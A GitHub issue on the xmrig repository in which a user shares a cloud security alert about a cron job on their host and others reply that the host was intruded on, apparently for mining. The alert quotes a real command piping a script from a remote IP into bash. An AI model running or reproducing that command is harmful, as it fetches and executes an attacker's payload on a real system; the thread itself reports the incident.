---
title: 为什么要向我投毒？
source_url: https://github.com/xmrig/xmrig/issues/2971
author: mousycoder
assignees: []
labels:
- av
created_at: '2022-03-15T09:56:40+00:00'
updated_at: '2022-04-03T14:57:07+00:00'
type: issue
status: closed
closed_at: '2022-04-03T14:57:07+00:00'
---

# Original Description
<img width="1267" alt="image" src="https://user-images.githubusercontent.com/6722977/158352738-75e0bfb5-83bd-467a-a1da-23c8120c2ddb.png">

恶意脚本-恶意脚本代码执行我已手工处理
[备注]()
该告警由如下引擎检测发现：
命令行: curl http://107.189.3.150/b2f628/cronb.sh
进程PID: 13985
进程文件名: curl
父进程ID: 13982
父进程: bash
父进程文件路径: /usr/bin/bash
进程链:
-[1096]  /usr/sbin/crond -n
    -[13979]  /usr/sbin/crond -n
        -[13982]  /bin/sh -c curl http://107.189.3.150/b2f628/cronb.sh|bash

事件说明: 云安全中心检测到您的主机正在执行恶意的脚本代码(包括但不限于bash、powershell、python)，请立刻排查入侵来源。如果是您的运维行为，请选择忽略。

# Discussion History
## snipeTR | 2022-03-15T10:29:59+00:00
Someone is trying to do unauthorized operations on your system using XMrig open source program. judging by the code layout it looks like remote access. The problem is not xmrig. the system is at your operator.
also by contacting your country's cybercrime police. If the exchanges that accept MONERO are inquired about who has a MONERO login from the WALLET address there, you can find the identity of the person doing this business.

@XMrig please tag AV

## mousycoder | 2022-03-15T10:44:44+00:00
thx very much !




------------------&nbsp;原始邮件&nbsp;------------------
发件人:                                                                                                                        "xmrig/xmrig"                                                                                    ***@***.***&gt;;
发送时间:&nbsp;2022年3月15日(星期二) 晚上6:30
***@***.***&gt;;
***@***.******@***.***&gt;;
主题:&nbsp;Re: [xmrig/xmrig] 为什么要向我投毒？ (Issue #2971)



 Someone is trying to do unauthorized operations on your system using XMrig open source program. judging by the code layout it looks like remote access. The problem is not xmrig. the system is at your operator.
 also by contacting your country's cybercrime police. If the exchanges that accept MONERO are inquired about who has a MONERO login from the WALLET address there, you can find the identity of the person doing this business.
—
Reply to this email directly, view it on GitHub, or unsubscribe.
Triage notifications on the go with GitHub Mobile for iOS or Android. 
You are receiving this because you authored the thread.Message ID: ***@***.***&gt;

## wule108 | 2022-03-21T04:42:40+00:00
要去域名注册商 投诉域名 zzhreceive.top 

# Action History
- Created by: mousycoder | 2022-03-15T09:56:40+00:00
- Closed at: 2022-04-03T14:57:07+00:00
